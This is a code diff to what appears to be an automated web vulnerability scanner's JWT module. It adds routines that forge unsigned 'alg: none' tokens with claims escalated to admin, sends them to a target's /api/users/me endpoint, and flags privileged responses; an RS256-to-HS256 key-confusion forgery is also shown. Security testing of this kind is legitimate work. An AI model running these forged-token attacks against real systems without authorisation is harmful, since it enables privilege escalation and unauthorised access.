@@ -46,8 +46,85 @@ def _forge_alg_none(token: str, new_header: dict[str, str]) -> str:
     if len(parts) < 2:
         return ""
     payload_part = parts[1]
-    header_b64 = _b64_encode(json.dumps(new_header).encode())
+    header_b64 = _jwt_json_part(new_header)
     return f"{header_b64}.{payload_part}."
+
+
+def _jwt_json_part(data: dict[str, Any]) -> str:
+    return _b64_encode(json.dumps(data, separators=(",", ":"), sort_keys=True).encode())
+
+
+def _decode_jwt_json(part: str) -> dict[str, Any]:
+    try:
+        decoded = json.loads(_b64_decode(part))
+    except Exception:
+        return {}
+    return decoded if isinstance(decoded, dict) else {}
+
+
+def _forge_unsecured_jwt(header: dict[str, Any], payload: dict[str, Any]) -> str:
+    alg_none = dict(header)
+    alg_none["alg"] = "none"
+    return f"{_jwt_json_part(alg_none)}.{_jwt_json_part(payload)}."
+
+
+def _claim_tamper_variants(payload: dict[str, Any]) -> list[tuple[str, dict[str, Any]]]:
+    variants: list[tuple[str, dict[str, Any]]] = []
+
+    def add(label: str, updates: dict[str, Any]) -> None:
+        tampered = dict(payload)
+        tampered.update(updates)
+        if tampered != payload:
+            variants.append((label, tampered))
+
+    if "role" in payload:
+        add("role=admin", {"role": "admin"})
+    if "roles" in payload:
+        roles = payload.get("roles")
+        if isinstance(roles, list):
+            add("roles+=admin", {"roles": sorted({*map(str, roles), "admin"})})
+        elif isinstance(roles, str):
+            add("roles=admin", {"roles": "admin"})
+    if "scope" in payload:
+        scope = str(payload.get("scope") or "")
+        add("scope+=admin", {"scope": " ".join(part for part in (scope, "admin") if part).strip()})
+    if "scopes" in payload:
+        scopes = payload.get("scopes")
+        if isinstance(scopes, list):
+            add("scopes+=admin", {"scopes": sorted({*map(str, scopes), "admin"})})
+    for flag in ("admin", "is_admin"):
+        if flag in payload:
+            add(f"{flag}=true", {flag: True})
+    if "permissions" in payload:
+        perms = payload.get("permissions")
+        if isinstance(perms, list):
+            add("permissions+=admin", {"permissions": sorted({*map(str, perms), "admin"})})
+        elif isinstance(perms, str):
+            add("permissions=admin", {"permissions": "admin"})
+    if not variants and payload:
+        add("role=admin", {"role": "admin"})
+
+    return variants[:6]
+
+
+def _claim_snapshot(payload: dict[str, Any]) -> dict[str, Any]:
+    keys = ("role", "roles", "scope", "scopes", "admin", "is_admin", "permissions")
+    return {key: payload[key] for key in keys if key in payload}
+
+
+def _privileged_claim_response(baseline: dict[str, Any], status: int, body: str) -> bool:
+    if status != 200:
+        return False
+    baseline_status = baseline.get("status") if baseline else None
+    if baseline_status is None:
+        return False
+    if baseline_status != 200:
+        return True
+    lower = str(body or "").lower()
+    privileged_markers = ("admin", "role", "scope", "permission", "superuser")
+    if any(marker in lower for marker in privileged_markers):
+        return str(baseline.get("preview", "")).lower() != lower[:240]
+    return False
 
 
 async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> dict[str, Any]:
@@ -93,11 +170,12 @@ async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> d
         parts = token.split(".")
         if len(parts) >= 2:
             try:
-                decoded_header = json.loads(_b64_decode(parts[0]))
-                json.loads(_b64_decode(parts[1]))
+                decoded_header = _decode_jwt_json(parts[0])
+                decoded_payload = _decode_jwt_json(parts[1])
                 logger.info("JWT header: %s", decoded_header)
             except Exception:
                 decoded_header = {}
+                decoded_payload = {}
 
             for alg_header in JWT_ALG_NONE_HEADERS:
                 tested += 1
@@ -140,12 +218,57 @@ async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> d
                     except Exception:
                         pass
 
+            for label, tampered_payload in _claim_tamper_variants(decoded_payload):
+                for alg_header in JWT_ALG_NONE_HEADERS:
+                    tested += 1
+                    forged = _forge_unsecured_jwt(alg_header, tampered_payload)
+                    async with sem:
+                        try:
+                            r = await _session.request(
+                                "GET",
+                                f"{target}/api/users/me",
+                                headers={"Authorization": f"Bearer {forged}"},
+                            )
+                            if _privileged_claim_response(baseline_user_me, r.status, r.text):
+                                findings.append(
+                                    {
+                                        "type": "jwt_claim_tampering",
+                                        "payload": label,
+                                        "evidence": (
+                                            "Server accepted unsigned JWT with privileged claim mutation "
+                                            f"(status {r.status})"
+                                        ),
+                                        "response_preview": r.text[:300],
+                                        "control": {
+                                            "baseline_user_me": baseline_user_me,
+                                            "forged_status": r.status,
+                                            "forged_size": r.body_length,
+                                            "forged_preview": r.text[:180],
+                                            "header": alg_header,
+                                            "original_claims": _claim_snapshot(decoded_payload),
+                                            "tampered_claims": _claim_snapshot(tampered_payload),
+                                        },
+                                        "severity": "critical",
+                                    }
+                                )
+                            control_evidence.append(
+                                {
+                                    "type": "jwt_claim_tampering",
+                                    "payload": label,
+                                    "status": r.status,
+                                    "size": r.body_length,
+                                    "preview": r.text[:180],
+                                }
+                            )
+                        except Exception:
+                            pass
+
             # --- RS256 -> HS256 confusion ---
             if decoded_header.get("alg", "").startswith("RS"):
                 tested += 1
                 confused = dict(decoded_header)
                 confused["alg"] = "HS256"
-                header_b64 = _b64_encode(json.dumps(confused).encode())
+                header_b64 = _jwt_json_part(confused)
                 forged_hs = f"{header_b64}.{parts[1]}.fakesig"
                 async with sem:
                     try:
